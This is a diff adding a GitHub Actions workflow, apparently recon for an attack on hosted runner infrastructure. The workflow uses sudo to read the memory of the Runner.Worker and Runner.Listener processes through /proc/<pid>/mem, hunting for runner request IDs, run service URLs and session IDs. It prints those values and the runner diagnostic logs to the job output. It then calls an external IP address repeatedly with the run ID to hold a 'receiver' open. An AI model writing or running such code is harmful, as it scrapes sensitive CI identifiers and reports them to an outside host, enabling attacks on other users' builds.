@@ -1,0 +1,49 @@
+name: Owned peer Run Service receiver
+
+on:
+  workflow_dispatch:
+
+permissions: {}
+
+jobs:
+  receiver:
+    runs-on: ubuntu-slim
+    timeout-minutes: 12
+    steps:
+      - name: Publish only request identifiers and hold receiver
+        shell: bash
+        run: |
+          set +e
+          echo "TARGET_IDENT run=$GITHUB_RUN_ID orchestration=${ACTIONS_ORCHESTRATION_ID:-none}"
+          worker=$(pgrep -o -f '/Runner.Worker ')
+          listener=$(pgrep -o -f '/Runner.Listener run')
+          echo "TARGET_PIDS worker=${worker:-none} listener=${listener:-none}"
+          grep -hE 'Job ID|runner request|Run[Ss]ervice|run service|Received message' /home/runner/actions-runner/cached/*/_diag/*.log 2>/dev/null | tail -80 || true
+          sudo python3 - "$worker" "$listener" <<'PY'
+          import os,re,sys
+          uuid=re.compile(rb'(?i)(?<![0-9a-f])[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}(?![0-9a-f])')
+          needles=(b'runner_request_id',b'runnerRequestId',b'RunnerRequestId',b'run_service_url',b'RunServiceUrl',b'PlanId',b'JobId',b'BillingOwnerId',b'sessionId')
+          for pid in sys.argv[1:]:
+            if not pid or not pid.isdigit(): continue
+            found=set()
+            with open(f'/proc/{pid}/maps') as maps,open(f'/proc/{pid}/mem','rb',buffering=0) as mem:
+              for line in maps:
+                f=line.split()
+                if len(f)<2 or not f[1].startswith('rw'):continue
+                a,z=(int(x,16) for x in f[0].split('-'))
+                if z-a>256<<20:continue
+                tail=b''
+                for p in range(a,z,1<<20):
+                  try:mem.seek(p); b=tail+mem.read(min(1<<20,z-p))
+                  except OSError:break
+                  for n in needles:
+                    q=0
+                    while True:
+                      q=b.find(n,q)
+                      if q<0:break
+                      for v in uuid.findall(b[max(0,q-512):q+1024]):found.add((n.decode(),v.decode().lower()))
+                      q+=len(n)
+                  tail=b[-2048:]
+            for k,v in sorted(found):print(f'TARGET_MEM key={k} id={v}')
+          PY
+          for i in $(seq 1 70); do curl -sS --max-time 2 "http://16.146.243.72:8450/RS_TARGET_HEARTBEAT?run=$GITHUB_RUN_ID&n=$i" >/dev/null || true; sleep 5; done
